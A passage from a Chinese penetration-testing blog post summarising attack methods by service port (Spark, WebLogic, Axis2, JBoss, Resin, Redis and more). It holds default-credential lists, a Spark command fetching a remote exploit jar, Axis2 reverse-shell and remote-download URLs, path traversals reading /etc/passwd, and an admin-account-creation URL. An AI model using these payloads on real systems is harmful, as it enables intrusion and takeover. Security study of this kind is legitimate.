+<h1 id="DB2：5000"><a href="#DB2：5000" class="headerlink" title="DB2：5000"></a><strong>DB2：5000</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）。</li>
+</ol>
+<h1 id="SysBase：4100、4200、5000"><a href="#SysBase：4100、4200、5000" class="headerlink" title="SysBase：4100、4200、5000"></a>SysBase：4100、4200、5000</h1><p>4100（监听）、4200（备份）、5000（服务）</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>注入</li>
+</ol>
+<h1 id="VNC：5900、5901、5902"><a href="#VNC：5900、5901、5902" class="headerlink" title="VNC：5900、5901、5902"></a><strong>VNC：5900、5901、5902</strong></h1><p>一款优秀的远控工具，常用语类UNIX系统上。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令：VNCX4.exe</li>
+<li>认证口令绕过</li>
+<li>拒绝服务攻击：CVE-2015-5239</li>
+<li>权限提升：CVE-2013-6886</li>
+</ol>
+<h1 id="PostgreSQL：5432"><a href="#PostgreSQL：5432" class="headerlink" title="PostgreSQL：5432"></a><strong>PostgreSQL：5432</strong></h1><p>一种特性非常齐全的自由软件的对象–关系型数据库管理系统。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令：postgres&#x2F;postgres</li>
+<li>缓冲区溢出：CVE-2014-2669</li>
+<li>XXE：老版本</li>
+<li>注入</li>
+<li>读写文件</li>
+<li>命令执行</li>
+</ol>
+<h1 id="Pcanywhere：5632"><a href="#Pcanywhere：5632" class="headerlink" title="Pcanywhere：5632"></a><strong>Pcanywhere：5632</strong></h1><p>一款远控工具，有点类似vnc的功能。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>提权控制服务，下载cif解密，或者找到版本并上传自己生成的cif进行连接。</li>
+<li>拒绝服务攻击</li>
+</ol>
+<h1 id="Spark：6066、7077、8081、8082"><a href="#Spark：6066、7077、8081、8082" class="headerlink" title="Spark：6066、7077、8081、8082"></a><strong>Spark：6066、7077、8081、8082</strong></h1><p>一款快速通用的集群计算平台。</p>
+<p><strong>攻击方式</strong></p>
+<p>未授权RCE。</p>
+<p>利用REST API，向6066端口发送指令创建任务，使其主动调用部署在远程服务器上的攻击脚本执行代码，随后点击日志查看结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./submit.sh 10.188.201.91:6066 2.1.0 https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>利用Apache Spark自带的脚本bin&#x2F;spark-submit，向master的主端口7077提交应用，随后点击日志查看结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id</span><br></pre></td></tr></table></figure>
+
+<h1 id="Redis：6379"><a href="#Redis：6379" class="headerlink" title="Redis：6379"></a>Redis：6379</h1><p>key-value数据库。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>未授权访问</li>
+<li>linux：写公钥ssh提权；在crontab写定时任务反弹shell；在web目录下写shell。</li>
+<li>win：写入启动项；写入mof、dll劫持等；在web目录下写shell。</li>
+</ol>
+<h1 id="WebLogic：7001、7002"><a href="#WebLogic：7001、7002" class="headerlink" title="WebLogic：7001、7002"></a><strong>WebLogic：7001、7002</strong></h1><p>7001（http）、7002（https）</p>
+<p><strong>攻击方式：</strong></p>
+<ol>
+<li><p>控制台路径泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">weblogic/weblogic、Oracle@123、weblogic123、12345678 </span><br><span class="line">system/password、security </span><br><span class="line">admin/security </span><br><span class="line">mary/password </span><br><span class="line">joe/password </span><br><span class="line">wlcsystem/wlcsystem </span><br><span class="line">wlpisystem/wlpisystem</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>登录console后部署webshell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deploy=&gt;web application modules=&gt;Deploy a new Web Application Module...=&gt;upload your file(s)=&gt;Deploy</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>部署&#x3D;&gt;安装&#x3D;&gt;上载文件&#x3D;&gt;部署档案&#x3D;&gt;将此部署安装为应用程序。</p>
+</li>
+<li><p>java反序列化-T3协议:</p>
+<p>CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628 CVE-2018-2893、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252 CVE-2019-2725、CVE-2019-2729、cve-2020-2883、CVE-2020-14644&#x2F;14645</p>
+</li>
+<li><p>XMLDecoder反序列化：CVE-2017-3506、CVE-2017-10271</p>
+</li>
+<li><p>Oracle Coherence反序列化：CVE-2020-2555</p>
+</li>
+<li><p>IIOP反序列化：CVE-2020-2551</p>
+</li>
+<li><p>未授权访问：CVE-2020-14882&#x2F;14883</p>
+</li>
+<li><p>任意文件上传：CVE-2018-2894、CVE-2019-2618</p>
+</li>
+<li><p>任意文件读取：CVE-2019-2615</p>
+</li>
+<li><p>SSRF：CVE-2014-4210</p>
+</li>
+<li><p>密码破解</p>
+</li>
+</ol>
+<h1 id="Cloudera-Manager：7180、7183"><a href="#Cloudera-Manager：7180、7183" class="headerlink" title="Cloudera Manager：7180、7183"></a><strong>Cloudera Manager：7180、7183</strong></h1><p>7180（http）、7183（https）</p>
+<p><strong>攻击方式：</strong></p>
+<ol>
+<li>弱口令：admin&#x2F;admin</li>
+</ol>
+<h1 id="Resin：8080"><a href="#Resin：8080" class="headerlink" title="Resin：8080"></a><strong>Resin：8080</strong></h1><p>应用服务器。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>目录遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp /resin-admin/status.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>任意文件读取：特定版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Caucho Technology Resin v3.0.17-21 for Windows </span><br><span class="line">Caucho Technology Resin v3.1.0 for Windows </span><br><span class="line">Caucho Technology Resin Professional v3.1.0 for Windows</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd </span><br><span class="line">/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd /%20..\\\\web-inf&quot; /C:%5C/</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="Tomcat：8080"><a href="#Tomcat：8080" class="headerlink" title="Tomcat：8080"></a><strong>Tomcat：8080</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li><p>任意文件包含：</p>
+<p>CVE-2020-1938 Ghostcat，AJP 8009端口</p>
+</li>
+<li><p>RCE：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-9484 会话持久性，cluster功能共享session，利用条件苛刻 </span><br><span class="line">CVE-2019-0232 /cgi-bin/，利用条件苛刻 </span><br><span class="line">CVE-2017-12615 需要readonly=false，默认是true</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p>
+</li>
+<li><p>弱口令：manager后台</p>
+</li>
+</ol>
+<h1 id="Axis2：8080"><a href="#Axis2：8080" class="headerlink" title="Axis2：8080"></a><strong>Axis2：8080</strong></h1><p>新一代的SOAP引擎，可构建webservice。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令：manager后台，admin&#x2F;axis2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/axis2/axis2-admin/login 登录 </span><br><span class="line">/axis2/services/Cat/exec?cmd=whoami 命令执行 </span><br><span class="line">/axis2/services/config/exec?cmd=whoami </span><br><span class="line">/axis2/services/Cat/shell?host=192.168.76.1&amp;port=2222   反弹shell /axis2/services/Cat/getClassPath</span><br><span class="line">/axis2/services/FileUploader?wsdl 构造上传页面 </span><br><span class="line">/axis2/services/FileUploader/uploadFile?document=码 </span><br><span class="line">/axis2/services/config/download?url=http://XXXX或IP:2475/test.jsp&amp;path=路径test.jsp   远程下载</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响。</p>
+</li>
+</ol>
+<h1 id="Jetty：8080"><a href="#Jetty：8080" class="headerlink" title="Jetty：8080"></a><strong>Jetty：8080</strong></h1><p>一款Java Web服务器。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>目录遍历：CVE-2011-4404</li>
+<li>远程共享缓冲区泄漏：CVE-2015-2080</li>
+</ol>
+<h1 id="Jenkins：8080、8089"><a href="#Jenkins：8080、8089" class="headerlink" title="Jenkins：8080、8089"></a><strong>Jenkins：8080、8089</strong></h1><p>Java开发的一种持续集成工具，监控持续重复的工作。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令：admin&#x2F;admin</p>
+<p>登录后寻找脚本执行界面：<a href="http://ip:port/script">http://ip:port/script</a> </p>
+<p>执行：println &quot;ifconfig&quot;.execute().text</p>
+</li>
+<li><p>未授权访问</p>
+</li>
+<li><p>反序列化</p>
+</li>
+</ol>
+<h1 id="Jboss：8080、9990"><a href="#Jboss：8080、9990" class="headerlink" title="Jboss：8080、9990"></a><strong>Jboss：8080、9990</strong></h1><p>8080（console），其他端口1098&#x2F;1099&#x2F;4444&#x2F;4445&#x2F;8080&#x2F;8009&#x2F;8083&#x2F;8093</p>
+<p><strong>攻击方式：</strong></p>
+<ol>
+<li><p>弱口令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin、admin-console、jmx-console、web-console、status</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>直接部署war包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:flavor=URL,type=DeploymentScanner</span><br><span class="line">/admin-console/secure/resourceContentCreate.seam?conversationId=32</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Java反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CVE-2013-4810       /invoker/EJBInvokerServlet </span><br><span class="line">CVE-2015-7501       /invoker/JMXInvokerServlet </span><br><span class="line">CVE-2017-7504       /jbossmq-httpil/HTTPServerILServlet </span><br><span class="line">CVE-2017-12149      /invoker/readonly</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin-console/login.seam </span><br><span class="line">/jmx-console/HtmlAdaptor?action=displayMBeans </span><br><span class="line">/web-console/ServerInfo.jsp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>返回头中泄露中间件版本信息</p>
+<p>X-Powered-By</p>
+</li>
+<li><p>Jboss蠕虫：&#x2F;zecmd&#x2F;zecmd.jsp、idssvc.jsp、iesvc.jsp、wstats.jsp、invoker.jsp</p>
+</li>
+<li><p>seam2模板注入：CVE-2010-1871</p>
+</li>
+</ol>
+<h1 id="InfluxDB：8086"><a href="#InfluxDB：8086" class="headerlink" title="InfluxDB：8086"></a>InfluxDB：8086</h1><p>go语言编写的时序数据库。</p>
+<p><strong>攻击方式</strong></p>
+<p>1.未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8086/debug/vars</span><br><span class="line"></span><br><span class="line">post http://ip:8086/query</span><br><span class="line">q=show+databases</span><br></pre></td></tr></table></figure>
+
+<h1 id="Apache-Activemq：8161、61616"><a href="#Apache-Activemq：8161、61616" class="headerlink" title="Apache Activemq：8161、61616"></a>Apache Activemq：8161、61616</h1><p>8161（后台）、61616（tcp）</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令：admin&#x2F;admin</p>
+</li>
+<li><p>未授权访问：&lt;&#x3D;5.7.0 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXXXX:8161/admin http://XXXXXXXX:8161/fileserver/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>文件上传：5.X ~ 5.11.X（5.12.x-5.13.x默认关闭这个应用，5.14.x已经删除）</p>
+<p>CVE-2016-3088：PUT报错获取物理路径（&#x2F;什么什么&#x2F;apache-activemq-5.11.1&#x2F;webapps&#x2F;admin）并传文件，MOVE移动到admin下 。</p>
+<p>写入webshell 。</p>
+<p>写入cron或ssh key等文件 。</p>
+<p>写入jar或jetty.xml等库和配置文件。</p>
+</li>
+<li><p>反序列化：&lt;5.13.X</p>
+<p>CVE-2015-5254：构造事件发送给目标61616端口，登录web界面点击触发事件</p>
+</li>
+</ol>
+<h1 id="Sun-AnswerBook2：8888"><a href="#Sun-AnswerBook2：8888" class="headerlink" title="Sun AnswerBook2：8888"></a><strong>Sun AnswerBook2：8888</strong></h1><p>文档服务器软件，使用第三方的web服务器dwhttpd提供web访问功能，但没有对所有的管理脚本都做访问控制，允许未授权用户访问一些管理脚本。</p>
+<p><strong>攻击方式</strong></p>
+<p>1.2 - 1.4.2        影响版本</p>
+<ol>
+<li><p>未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://IP:8888/ab2/@AdminViewError 访问错误日志 </span><br><span class="line">http://IP:8888/ab2/@AdminAddadmin?uid=foo&amp;password=bar&amp;re_password=bar 添加账户和密码</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>远程格式化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;print&quot;GET /&quot;;print&quot;%x&quot;x20;print&quot; HTTP/1.0\r\n\r\n\r\n\&quot;&#x27; | nc localhost 8888</span><br></pre></td></tr></table></figure>
+
+<p>可以看到报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http-8888 waring:send-file reports: the requested object。。。。。 </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>任意文件读取</p>
+</li>
+</ol>
+<h1 id="Websphere：9090、9091"><a href="#Websphere：9090、9091" class="headerlink" title="Websphere：9090、9091"></a><strong>Websphere：9090、9091</strong></h1><p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令：控制台&#x2F;ibm&#x2F;console&#x2F;logon.jsp，WebSphere企业应用程序-&gt;安裝</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin/admin </span><br><span class="line">websphere/websphere </span><br><span class="line">ststem/manager </span><br><span class="line">admin/空 </span><br><span class="line">Websphere6.x-7.x</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>任意文件泄漏：CVE-2014-0823</p>
+</li>
+<li><p>信息泄露：CVE-2017-1423、CVE-2019-4505</p>
+</li>
+<li><p>java反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2015-7450、CVE-2018-1567、CVE-2019-4279、CVE-2020-4276、CVE-2020-4362、CVE-2020-4450</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="Elasticsearch：9200、9300"><a href="#Elasticsearch：9200、9300" class="headerlink" title="Elasticsearch：9200、9300"></a><strong>Elasticsearch：9200、9300</strong></h1><p>9200（http）、9300（tcp）</p>
+<p>服务名：wap-wsp，搜索服务器，企业级搜索引擎，支持通过HTTP使用JSON进行数据索引。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>远程代码执行：</p>
+<p>MVEL &lt;1.1.1 CVE-2014-3120 </p>
+<p>沙盒绕过Groovy代码执行 1.3.0-1.3.7、1.4.0-1.4.2 CVE-2015-1427</p>
+</li>
+<li><p>任意文件读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_plugin/head/      &lt;1.4.5以下或&lt;1.5.2       CVE-2015-3337 </span><br><span class="line">/_snapshot        1.0.0-1.6.0      CVE-2015-5531</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>未授权访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXXX:9200/ </span><br><span class="line">http://XXXXXX:9200/_plugin/head/ </span><br><span class="line">http://XXXXXX:9200/_nodes </span><br><span class="line">http://XXXXXX:9200/_search?preety</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="Zabbix：10050、10051"><a href="#Zabbix：10050、10051" class="headerlink" title="Zabbix：10050、10051"></a>Zabbix：10050、10051</h1><p>10050（agent）、10051（server）</p>
+<p>基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令：Admin&#x2F;zabbix、zabbix&#x2F;zabbix、guest&#x2F;空，登录后命令执行</li>
+<li>前台注入（非登录）&lt;3.0.4</li>
+</ol>
+<h1 id="memcache：11211"><a href="#memcache：11211" class="headerlink" title="memcache：11211"></a><strong>memcache：11211</strong></h1><p>一套分布式的高速缓存系统，使用的key-value存储目，前被许多网站使用以提升网站的访问速度，尤其对于一些大型的、需要频繁访问数据库的网站访问速度提升效果十分显著。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>未授权访问（IP限制）：telnet上以后执行stats items。</li>
+</ol>
+<h1 id="MongoDB：27017、28017"><a href="#MongoDB：27017、28017" class="headerlink" title="MongoDB：27017、28017"></a><strong>MongoDB：27017、28017</strong></h1><p>28017（REST接口）</p>
+<p>NoSQL数据库，mongodb默认允许空口令远程连接，数据库本身可以限制登录IP的。</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li>弱口令</li>
+<li>未授权访问</li>
+</ol>
+<h1 id="Hadoop：more"><a href="#Hadoop：more" class="headerlink" title="Hadoop：more"></a><strong>Hadoop：more</strong></h1><p>HDFS NameNode 50070<br>HDFS SecondNameNode 50090<br>HDFS DataNode 50075<br>HDFS Backup&#x2F;Checkpoint node 50105<br>MapReduce JobTracker 50030<br>MapReduce TaskTracker 50060</p>
+<p><strong>攻击方式</strong></p>
+<ol>
+<li><p>弱口令：admin&#x2F;123456</p>
+</li>
+<li><p>命令执行</p>
+</li>
+<li><p>注入：EasyHadoopManager1.1.1-1 Beta1版本</p>
+</li>
+<li><p>对外访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXX/cluster/nodes </span><br><span class="line">http://XXXXXXX/logs/ </span><br><span class="line">http://XXXXXXX/dfshealth.jsp </span><br><span class="line">http://XXXXXX/jobtracker.jsp</span><br></pre></td></tr></table></figure></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">V3teran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://v3teran.github.io/2021/02/07/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">https://v3teran.github.io/2021/02/07/端口渗透总结/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://V3teran.github.io" target="_blank">V3teran's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AB%AF%E5%8F%A3/">端口</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194504.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/06/Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM%E5%8D%8F%E8%AE%AE/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194748.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Windows认证之NTLM协议</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/08/SPN%E5%92%8CKerberoast%E6%94%BB%E5%87%BB/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194338.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SPN和Kerberoast攻击</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/09/%E5%90%84%E7%A7%8D%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/" title="各种通信隧道"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194231.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-09</div><div class="title">各种通信隧道</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.</span> <span class="toc-text">服务默认端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FTP%EF%BC%9A20%E3%80%8121%E3%80%8169"><span class="toc-number">2.</span> <span class="toc-text">FTP：20、21、69</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH%EF%BC%9A22"><span class="toc-number">3.</span> <span class="toc-text">SSH：22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telnet%EF%BC%9A23"><span class="toc-number">4.</span> <span class="toc-text">Telnet：23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMTP%EF%BC%9A25%E3%80%81465"><span class="toc-number">5.</span> <span class="toc-text">SMTP：25、465</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS%EF%BC%9A53"><span class="toc-number">6.</span> <span class="toc-text">DNS：53</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DHCP%EF%BC%9A67%E3%80%8168%E3%80%81546"><span class="toc-number">7.</span> <span class="toc-text">DHCP：67、68、546</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IIS%EF%BC%9A80%E3%80%8181%E3%80%81443"><span class="toc-number">8.</span> <span class="toc-text">IIS：80、81、443</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache%EF%BC%9A80"><span class="toc-number">9.</span> <span class="toc-text">Apache：80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx%EF%BC%9A80"><span class="toc-number">10.</span> <span class="toc-text">Nginx：80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IPCAM%EF%BC%9A81"><span class="toc-number">11.</span> <span class="toc-text">IPCAM：81</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP3%EF%BC%9A109%E3%80%81110%E3%80%81995"><span class="toc-number">12.</span> <span class="toc-text">POP3：109、110、995</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Samba%EF%BC%9A137%E3%80%81139%E3%80%81445"><span class="toc-number">13.</span> <span class="toc-text">Samba：137、139、445</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Netbios%EF%BC%9A137%E3%80%81138%E3%80%81139"><span class="toc-number">14.</span> <span class="toc-text">Netbios：137、138、139</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IMAP%EF%BC%9A143%E3%80%81993"><span class="toc-number">15.</span> <span class="toc-text">IMAP：143、993</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SNMP%EF%BC%9A161"><span class="toc-number">16.</span> <span class="toc-text">SNMP：161</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP%EF%BC%9A389"><span class="toc-number">17.</span> <span class="toc-text">LDAP：389</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMB%EF%BC%9A139%E3%80%81445"><span class="toc-number">18.</span> <span class="toc-text">SMB：139、445</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-R%EF%BC%9A512%E3%80%81513%E3%80%81514"><span class="toc-number">19.</span> <span class="toc-text">Linux R：512、513、514</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rsync%EF%BC%9A873"><span class="toc-number">20.</span> <span class="toc-text">Rsync：873</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socket-agent%EF%BC%9A1080"><span class="toc-number">21.</span> <span class="toc-text">Socket agent：1080</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%EF%BC%9A1090%E3%80%811099"><span class="toc-number">22.</span> <span class="toc-text">RMI：1090、1099</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lotus%EF%BC%9A1352"><span class="toc-number">23.</span> <span class="toc-text">Lotus：1352</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL%EF%BC%9A1433%E3%80%811434"><span class="toc-number">24.</span> <span class="toc-text">MSSQL：1433、1434</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle%EF%BC%9A1521"><span class="toc-number">25.</span> <span class="toc-text">Oracle：1521</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NFS%EF%BC%9A2049"><span class="toc-number">26.</span> <span class="toc-text">NFS：2049</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zookeeper%EF%BC%9A2181"><span class="toc-number">27.</span> <span class="toc-text">Zookeeper：2181</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Grafana%EF%BC%9A3000"><span class="toc-number">28.</span> <span class="toc-text">Grafana：3000</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%EF%BC%9A3306"><span class="toc-number">29.</span> <span class="toc-text">MySQL：3306</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-RDP%EF%BC%9A3389"><span class="toc-number">30.</span> <span class="toc-text">Windows RDP：3389</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GlassFish%EF%BC%9A4848%E3%80%818080%E3%80%813700"><span class="toc-number">31.</span> <span class="toc-text">GlassFish：4848、8080、3700</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DB2%EF%BC%9A5000"><span class="toc-number">32.</span> <span class="toc-text">DB2：5000</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SysBase%EF%BC%9A4100%E3%80%814200%E3%80%815000"><span class="toc-number">33.</span> <span 